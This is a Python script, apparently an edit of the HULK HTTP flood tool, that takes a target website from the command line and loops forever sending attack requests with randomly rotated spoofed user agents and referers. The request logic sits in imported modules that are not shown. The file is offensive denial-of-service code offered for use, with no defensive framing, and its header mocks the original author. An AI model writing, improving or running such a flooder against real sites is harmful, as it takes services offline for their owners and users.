"""
HTTP UNBEARBALE LOAD QUEEN
A HULK EDIT BY @OBN0XIOUS
THE ORIGINAL MAKER OF HULK PLEASE GO BACK TO CODECADEMY
"""

import sys
import argparse
import random

import hulqThreading
import hulqRequest

parser = argparse.ArgumentParser()
parser.add_argument('--threads', '-t', default=2, action='store', help='Choose how many threads.')
parser.add_argument('--website', '-w', action='store', help='Website you are attacking.')
systemArguments = parser.parse_args()


userAgents = \
	(
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3', \
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729', \
	'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729', \
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1', \
	'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US AppleWebKit/532.1 (KHTML, \ like Gecko Chrome/4.0.219.6 Safari/532.1', \
	'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2', \
	'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729', \
	'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0', \
	'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2', \
	'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US', \
	'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP', \
	'Opera/9.80 (Windows NT 5.2; U; ru Presto/2.5.22 Version/10.51'	
	)


referers = \
	(
		'http://www.google.com/?q=', \
		'http://www.usatoday.com/search/results?q=', \
		'http://engadget.search.aol.com/search?q='
		)



while True:
	userAgent = random.choice(userAgents)
	referer = random.choice(referers)
	hulqRequest.httpAttackRequest(systemArguments.website, userAgent, referer)
